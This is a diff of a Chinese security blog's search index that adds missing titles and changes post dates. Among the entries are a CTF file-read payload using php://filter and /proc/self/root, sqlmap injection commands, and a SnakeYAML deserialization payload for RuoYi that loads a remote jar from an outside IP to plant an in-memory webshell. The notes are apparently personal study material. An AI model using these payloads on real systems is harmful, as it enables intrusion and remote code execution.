@@ -10973,8 +10973,8 @@ if (isset($_SESSION['username'])) {
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/02/10/2022Dest0g3%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
+    <title>2022Dest0g迎新赛</title>
+    <url>/2022/11/15/2022Dest0g3%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
     <content><![CDATA[<p>##phpdest<br><img src="/.com//2022-09-21-20-44-27.png"><br>绕过require_once限制</p>
 <ul>
 <li>/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接<br>payload:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self</span><br></pre></td></tr></table></figure>
@@ -11221,8 +11221,8 @@ if (isset($_SESSION['username'])) {
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/02/10/java-jdbc+%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <title>jav-jdbc+二次序列化</title>
+    <url>/2023/01/07/java-jdbc+%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<p>##jdbc反序列化</p>
 ]]></content>
   </entry>
@@ -11274,8 +11274,8 @@ if (isset($_SESSION['username'])) {
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/02/10/java-tabby%E5%AE%89%E8%A3%85/</url>
+    <title>java-tabby安装</title>
+    <url>/2022/12/21/java-tabby%E5%AE%89%E8%A3%85/</url>
     <content><![CDATA[<p>##Neo4j<br>如果经过很多的导入/删除操作，图数据库占用了很多的硬盘存储，那么可以将原有的图数据库删除，重新按照上面的步骤新建图数据库。 删除所有约束</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DROP CONSTRAINT c1;</span><br><span class="line">DROP CONSTRAINT c2;</span><br><span class="line">DROP CONSTRAINT c3;</span><br><span class="line">DROP CONSTRAINT c4;</span><br><span class="line">DROP INDEX index1;</span><br><span class="line">DROP INDEX index2;</span><br><span class="line">DROP INDEX index3;</span><br><span class="line">DROP INDEX index4;</span><br><span class="line">DROP INDEX index5;</span><br><span class="line">DROP INDEX index6;</span><br><span class="line">DROP INDEX index7;</span><br></pre></td></tr></table></figure>
 <p>##使用教程<br><code>这里使用的java版本是</code><br><img src="/.com//2022-11-28-09-06-47.png"><br>要使用tabby，首先需要导出项目所有Jar包。在IDEA中，可以通过”File -&gt; Project Structure -&gt; Project Settings -&gt; Artifacts”中添加一个Artifact，将项目打包出来，这样便能顺利导出所有项目相关的jar包以供tabby分析。<br><img src="/.com//2022-11-28-08-59-56.png"><br>随后运行”Build -&gt; Build Artifacts -&gt; Rebuild”即可导出到/out目录中。随后我们将这些jar包全放到上文”安装tabby“一节中，创建的jars目录下。在运行最好将/cache目录下的文件删除。随后运行命令<br>##Neo4j查询</p>
@@ -11562,7 +11562,7 @@ if (isset($_SESSION['username'])) {
   </entry>
   <entry>
     <title>java-字节码</title>
-    <url>/2022/12/06/java%E5%AD%97%E8%8A%82%E7%A0%81/</url>
+    <url>/2022/09/20/java%E5%AD%97%E8%8A%82%E7%A0%81/</url>
     <content><![CDATA[<h2 id="什么是字节码"><a href="#什么是字节码" class="headerlink" title="什么是字节码"></a>什么是字节码</h2><p>其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中</p>
 <p>更广义上来说，所有能恢复成一个类并在jvm虚拟机里加载的字节序列，都在我们的探讨范围内。</p>
 <h2 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h2><p><code>ClassLoader:</code></p>
@@ -11815,8 +11815,8 @@ if (isset($_SESSION['username'])) {
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/02/10/java%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81/</url>
+    <title>java字节码</title>
+    <url>/2022/09/14/java%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81/</url>
     <content><![CDATA[<p>##字节码<br>能够恢复成一个类并在jvm中加载的字节序列<br>##利用URLClassLoader加载远程class文件<br><code>ClassLoader</code>是java的类加载器，告诉java虚拟机如何加载这个类，默认根据类名加载类，并且这个类名是类完整路径，例如java.lang.Runtime<br>###URLClassLoader<br>正常情况下，java会根据sun.boot.class.path和java.class.path中列举的基础路径（这些路径是经过处理后的java.net.URl类）来寻找.class文件进行加载,基础路径有三种情况</p>
 <ul>
 <li>URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li>
@@ -11909,15 +11909,15 @@ if (isset($_SESSION['username'])) {
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/02/10/ruoyi%E5%90%8E%E5%8F%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/</url>
+    <title>ruoyi后台计划任务写入内存吗</title>
+    <url>/2022/11/08/ruoyi%E5%90%8E%E5%8F%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/</url>
     <content><![CDATA[<p><a href="http://110.42.133.120/java/yaml-payload-for-ruoyi/target/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar">http://110.42.133.120/java/yaml-payload-for-ruoyi/target/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar</a></p>
 <p>org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“<a href="http://110.42.133.120/java/yaml-payload-for-ruoyi/target/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar&quot;]]]]&#39;">http://110.42.133.120/java/yaml-payload-for-ruoyi/target/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar&quot;]]]]&#39;</a>)</p>
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/02/10/sqlmap%E6%8C%87%E4%BB%A4/</url>
+    <title>sqlmap指令</title>
+    <url>/2022/05/01/sqlmap%E6%8C%87%E4%BB%A4/</url>
     <content><![CDATA[<p>##access数据库+sqlmap指令<br>###get类型注入<br>1.检测是否存在注入点：<br><code>&#39;</code>、<code>and 1=1</code>、<code>and 1=2</code>、<br>2.使用sqlmap进行检测注入点是否可用</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u url</span><br></pre></td></tr></table></figure>
 <p>3.完整的access+sqlmap注入指令</p>
@@ -12005,8 +12005,8 @@ if (isset($_SESSION['username'])) {
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/02/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <title>代码审计小记</title>
+    <url>/2022/08/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
     <content><![CDATA[<p>##可访问文件收集<br>如果存在反序列化，这里可以直接利用<br>.//wp-content/plugins/product-import-export-for-woo/admin/modules/product_tags/import/import.php:272 : 读取文件函数中存在变量，可能存在任意文件读取漏洞</p>
 <p>如果可以覆盖文件写入的话<br>.//wp-content/plugins/woocommerce-germanized/vendor/globalcitizen/php-iban/php-iban.php:607 : 读取文件函数中存在变量，可能存在任意文件读取漏洞</p>
 ]]></content>
@@ -12039,8 +12039,8 @@ if (isset($_SESSION['username'])) {
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/02/10/%E5%9F%BA%E4%BA%8Efabric%E7%9A%84%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE/</url>
+    <title>基于fabric的区块链项目</title>
+    <url>/2023/12/17/%E5%9F%BA%E4%BA%8Efabric%E7%9A%84%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE/</url>
     <content><![CDATA[<p>#搭建fabric环境<br>##配置证书<br>fabric网络中节点之间通讯都需要提供证书用来标识自己的身份<br><code>cryptogen</code>工具快速生成相关证书<br>##配置系统链创世块<br>fabric系统配置是存放在区块链上的，系统成功运行至少要有一个链<br><code>configtxgen</code>生成系统链，第一个数据块保存了用户定义的一些配置，</p>
 <ul>
 <li>会读取configtx.yaml和<code>crypto-config</code>文件下的证书用于生成channel的创世块<br>生成的 genesis.block 是系统链的第一个区块，里面存放了 Orderer 节点、Orderer 管理员的证书，在 Orderer 节点启动时会用到这个数据块。<br>##如何理解fabric<br>类似于一个服务器，然后，<br>fabric用go语言实现链码，实现对peer节点的操作，也即是智能合约。<br>###链码<br>一共有五个节点，分为农户【farmer】，原料厂商【material】，生产厂商【productinfo+productProcess】，物流厂商【driver】，零售商【retailer】<br>####物流厂商<br>定义上链的信息结构体<br><img src="/.com//2022-12-07-20-44-20.png"><br>通过api接口使用各函数<br><img src="/.com//2022-12-07-20-48-56.png"><br>其他的链码定义方式同上<br>####路由<br>定义各个节点的路由<br><img src="/.com//2022-12-07-20-52-20.png"><br>####api代码<br>引入fabric-client模块，基于此模块进行fabric区块链网络的节点功能调用<br><img src="/.com//2022-12-07-20-54-05.png"><br>通过定义多个路由，利用以下代码进行区块链的上链查询等操作<br><img src="/.com//2022-12-07-21-10-06.png"></li>
